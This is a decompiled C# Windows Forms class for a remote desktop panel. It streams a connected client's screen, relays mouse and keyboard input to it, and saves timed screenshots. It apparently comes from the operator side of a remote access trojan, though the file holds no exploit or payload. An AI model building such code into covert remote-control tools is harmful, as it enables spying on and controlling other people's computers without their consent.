using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace Server.Forms
{
	// Token: 0x02000094 RID: 148
	public partial class FormRemoteDesktop : Form
	{
		// Token: 0x170000CB RID: 203
		// (get) Token: 0x06000402 RID: 1026 RVA: 0x000042A1 File Offset: 0x000024A1
		// (set) Token: 0x06000403 RID: 1027 RVA: 0x000042A9 File Offset: 0x000024A9
		public Form1 F { get; set; }

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x06000404 RID: 1028 RVA: 0x000042B2 File Offset: 0x000024B2
		// (set) Token: 0x06000405 RID: 1029 RVA: 0x000042BA File Offset: 0x000024BA
		internal Clients ParentClient { get; set; }

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x06000406 RID: 1030 RVA: 0x000042C3 File Offset: 0x000024C3
		// (set) Token: 0x06000407 RID: 1031 RVA: 0x000042CB File Offset: 0x000024CB
		internal Clients Client { get; set; }

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x06000408 RID: 1032 RVA: 0x000042D4 File Offset: 0x000024D4
		// (set) Token: 0x06000409 RID: 1033 RVA: 0x000042DC File Offset: 0x000024DC
		public string FullPath { get; set; }

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x0600040A RID: 1034 RVA: 0x000042E5 File Offset: 0x000024E5
		// (set) Token: 0x0600040B RID: 1035 RVA: 0x000042ED File Offset: 0x000024ED
		public Image GetImage { get; set; }

		// Token: 0x0600040C RID: 1036 RVA: 0x000042F6 File Offset: 0x000024F6
		public FormRemoteDesktop()
		{
			this._keysPressed = new List<Keys>();
			this.InitializeComponent();
		}

		// Token: 0x0600040D RID: 1037 RVA: 0x00031DC4 File Offset: 0x0002FFC4
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x00031E18 File Offset: 0x00030018
		private void FormRemoteDesktop_Load(object sender, EventArgs e)
		{
			try
			{
				this.button1.Tag = "stop";
			}
			catch
			{
			}
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x00031E4C File Offset: 0x0003004C
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "capture";
				msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
				msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
				this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value), true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.numericUpDown1.Enabled = false;
				this.numericUpDown2.Enabled = false;
				this.btnSave.Enabled = true;
				this.btnMouse.Enabled = true;
				this.button1.Tag = "stop";
				this.button1.BackgroundImage = Resources.stop__1_;
				return;
			}
			this.button1.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			this.numericUpDown1.Enabled = true;
			this.numericUpDown2.Enabled = true;
			this.btnSave.Enabled = false;
			this.btnMouse.Enabled = false;
			this.button1.BackgroundImage = Resources.play_button;
		}

		// Token: 0x06000410 RID: 1040 RVA: 0x0003202C File Offset: 0x0003022C
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.timerSave.Enabled)
				{
					this.timerSave.Stop();
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.timerSave.Start();
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000411 RID: 1041 RVA: 0x000320CC File Offset: 0x000302CC
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Encoder quality = Encoder.Quality;
				EncoderParameters encoderParameters = new EncoderParameters(1);
				EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
				encoderParameters.Param[0] = encoderParameter;
				ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
				if (encoderParameters != null)
				{
					encoderParameters.Dispose();
				}
				if (encoderParameter != null)
				{
					encoderParameter.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000412 RID: 1042 RVA: 0x00032184 File Offset: 0x00030384
		private ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000413 RID: 1043 RVA: 0x000321C0 File Offset: 0x000303C0
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 8;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000414 RID: 1044 RVA: 0x00032320 File Offset: 0x00030520
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 16;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000415 RID: 1045 RVA: 0x00032484 File Offset: 0x00030684
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseMove";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000416 RID: 1046 RVA: 0x000325B4 File Offset: 0x000307B4
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.isMouse)
			{
				this.isMouse = false;
				this.btnMouse.BackgroundImage = Resources.mouse;
			}
			else
			{
				this.isMouse = true;
				this.btnMouse.BackgroundImage = Resources.mouse_enable;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x06000417 RID: 1047 RVA: 0x00032608 File Offset: 0x00030808
		private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Image getImage = this.GetImage;
				if (getImage != null)
				{
					getImage.Dispose();
				}
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000418 RID: 1048 RVA: 0x00032650 File Offset: 0x00030850
		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this.isKeyboard)
			{
				this.isKeyboard = false;
				this.btnKeyboard.BackgroundImage = Resources.keyboard;
			}
			else
			{
				this.isKeyboard = true;
				this.btnKeyboard.BackgroundImage = Resources.keyboard_on;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x06000419 RID: 1049 RVA: 0x000326A4 File Offset: 0x000308A4
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (this._keysPressed.Contains(e.KeyCode))
				{
					return;
				}
				this._keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x0600041A RID: 1050 RVA: 0x000327AC File Offset: 0x000309AC
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				this._keysPressed.Remove(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x0600041B RID: 1051 RVA: 0x00004333 File Offset: 0x00002533
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x0600041C RID: 1052 RVA: 0x0003289C File Offset: 0x00030A9C
		private void button2_Click(object sender, EventArgs e)
		{
			string directoryName = Path.GetDirectoryName(this.FullPath);
			try
			{
				if (!Directory.Exists(directoryName))
				{
					Directory.CreateDirectory(directoryName);
				}
				Process.Start(directoryName);
			}
			catch
			{
			}
		}

		// Token: 0x04000362 RID: 866
		public int FPS;

		// Token: 0x04000363 RID: 867
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000364 RID: 868
		public IUnsafeCodec decoder = new UnsafeStreamCodec(60, true);

		// Token: 0x04000365 RID: 869
		public Size rdSize;

		// Token: 0x04000366 RID: 870
		private bool isMouse;

		// Token: 0x04000367 RID: 871
		private bool isKeyboard;

		// Token: 0x04000368 RID: 872
		public object syncPicbox = new object();

		// Token: 0x04000369 RID: 873
		private readonly List<Keys> _keysPressed;
	}
}
